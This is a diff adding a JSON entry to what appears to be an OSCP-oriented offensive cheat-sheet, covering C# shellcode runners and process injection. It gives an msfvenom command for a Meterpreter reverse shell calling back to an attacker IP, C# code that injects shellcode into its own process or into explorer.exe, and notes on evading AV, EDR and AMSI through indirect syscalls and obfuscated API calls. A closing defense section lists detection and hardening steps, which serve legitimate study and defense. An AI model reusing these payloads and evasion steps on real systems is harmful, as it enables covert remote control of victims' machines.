@@ -1,0 +1,96 @@
+{
+  "id": "process-injection-runner",
+  "name": "C# Shellcode Runner & Process Injection",
+  "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=443 -f csharp",
+  "description": "A compiled runner keeps the malicious bytes out of any script AMSI can inspect. Self-injection allocates RWX in the current process (VirtualAlloc), copies the shellcode, and runs it with CreateThread. Remote injection targets a trusted signed process (OpenProcess explorer.exe, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) so the callback comes from a legitimate binary, defeating simple process heuristics.",
+  "type": "payload",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "msfvenom",
+    "mingw"
+  ],
+  "tags": [
+    "av-evasion",
+    "in-memory",
+    "process-injection",
+    "shellcode",
+    "csharp"
+  ],
+  "category": "Exploitation",
+  "subcategory": "AV Evasion",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 14: Antivirus Evasion",
+  "examples": [
+    {
+      "label": "Shellcode as a C# byte array for the runner",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.128 LPORT=443 -f csharp"
+    },
+    {
+      "label": "Self-injection API flow (VirtualAlloc + CreateThread)",
+      "command": "IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x1000, 0x40);\nMarshal.Copy(sc, 0, addr, sc.Length);\nIntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\nWaitForSingleObject(hThread, 0xFFFFFFFF);"
+    },
+    {
+      "label": "Remote injection into explorer.exe (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)",
+      "command": "Process target = Process.GetProcessesByName(\"explorer\")[0];\nIntPtr hProcess = OpenProcess(0x001F0FFF, false, target.Id);\nIntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x1000, 0x40);\nWriteProcessMemory(hProcess, addr, sc, sc.Length, out _);\nCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);"
+    }
+  ],
+  "notes": "Compile the C# runner on Kali with mcs runner.cs -out:runner.exe, or cross-compile with mono. For remote injection, pick a stable signed process (explorer, svchost, notepad) that matches your shellcode arch (x64). Add the P-Invoke signatures via DllImport (kernel32.dll): VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, OpenProcess. Because the shellcode only lives in the target process memory, on-disk AV never scans it \u2014 but behavioral engines flag VirtualAllocEx + WriteProcessMemory + CreateRemoteThread in sequence, so obfuscate the API call chain or use indirect syscalls for hardened targets. Pair with amsi-bypass if delivering via PowerShell first.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Antivirus Evasion",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Process Injection",
+      "url": "https://attack.mitre.org/techniques/T1055/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "amsi-bypass",
+      "rel": "prereq",
+      "note": "Kill AMSI before any PowerShell stage that loads or drops the runner."
+    },
+    {
+      "id": "powershell-shellcode-runner",
+      "rel": "alternative",
+      "note": "Purely script-based runner, no compile step needed."
+    },
+    {
+      "id": "cross-compile-exploit",
+      "rel": "prereq",
+      "note": "How to compile the C# runner from Kali using mcs/mono."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1055",
+    "T1620"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Process injection allocates memory in a remote process (OpenProcess \u2192 VirtualAllocEx), writes shellcode into it (WriteProcessMemory), and starts a remote thread to execute it (CreateRemoteThread or NtCreateThreadEx). The shellcode runs inside the target process's address space \u2014 EDR sees network/behavior anomalies from the target process (e.g., explorer.exe making C2 connections), not from the injecting process.",
+    "prerequisites": "Local admin or SeDebugPrivilege (for injecting into processes owned by other users). Target process PID. C# or C++ for the injector. Shellcode payload. AMSI bypass if injecting from PowerShell.",
+    "impact": "T1055 Process Injection + T1620 Reflective Code Loading. Executes shellcode under the identity and security context of the target process, hiding C2 communication within a trusted process. Evades process-level detection by attributing behavior to a legitimate process.",
+    "detection": "Sysmon Event 8: CreateRemoteThread in non-related processes. EDR: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread API sequence from a process that doesn't normally perform injection. Memory scan: shellcode in the target process's memory. Defender for Endpoint: 'Remote process injection' behavioral alert. ETW: kernel-level thread creation events.\nProcess injection by correlating memory manipulation API calls (VirtualAllocEx, WriteProcessMemory), suspicious thread creation (CreateRemoteThread), and unusual DLL loads within another process's context (DET0508/AN1399).\nptrace- or memfd-based injection through audit logs capturing system calls (ptrace, mmap) targeting running processes along with suspicious file descriptors or memory writes (AN1400).\nMemory-based injection via task_for_pid, mach_vm_write, and dylib injection patterns through DYLD_INSERT_LIBRARIES or manual memory mapping on macOS (AN1401).",
+    "artifacts": "Sysmon Event 8: CreateRemoteThread from injecting process to target | EDR alert: process injection API sequence | Memory scan: injected code in target process | Sysmon Event 10: source process opening handle to target (OpenProcess) | Anomalous network connection from target process",
+    "prevention": "EDR with injection detection. WDAC with memory integrity: Hypervisor-Protected Code Integrity (HVCI) prevents injection into protected processes. Protected Process Light (PPL) for critical processes. Block injection into high-value processes (lsass.exe, csrss.exe) via PPL. Deploy Defender for Endpoint P2 (advanced injection detection).\nBehavior Prevention on Endpoint: Configure endpoint security solutions to block process injection based on common injection sequences; Windows 10 ASR rules can prevent Office applications from code injection.\nPrivileged Account Management: Use Yama (ptrace_scope) on Linux to restrict ptrace to privileged users; deploy security kernel modules.",
+    "evasion": "Use indirect syscalls (NtCreateThreadEx directly) to bypass API-level hooks. Inject into processes owned by current user (no SeDebug required). Use less-detected injection techniques: APC injection, Atom Bombing, reflective DLL injection. Use a signed loader process.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1055/",
+      "https://attack.mitre.org/techniques/T1620/"
+    ],
+    "misconfiguration": "No EDR with memory injection detection. HVCI not enabled. No Sysmon Event 8 rule. PPL not configured for critical processes.",
+    "vulnerable_config": "# No Sysmon Event 8 configured:\n# sysmon -accepteula -i (no config) \u2192 missing CreateRemoteThread monitoring\n\n# HVCI not enabled:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard').HypervisorEnforcedCodeIntegrity  # 0\n# \u2192 Unsigned code injectable into any non-PPL process",
+    "secure_config": "# Enable Sysmon with CreateRemoteThread monitoring:\n# sysmon config:\n# <CreateRemoteThread onmatch='include'>\n#   <TargetImage condition='is not'>C:\\Windows\\system32\\svchost.exe</TargetImage>\n# </CreateRemoteThread>\n\n# Enable HVCI (Hypervisor-Protected Code Integrity):\n# Computer Config \u2192 Admin Templates \u2192 System \u2192 Device Guard\n# \u2192 Turn on Virtualization Based Security: Enabled\n# \u2192 Code Integrity Policy: HVCI Enabled\n\n# EDR: Defender for Endpoint behavioral injection detection\n# 'Remote process injection technique' detection alert"
+  }
+}
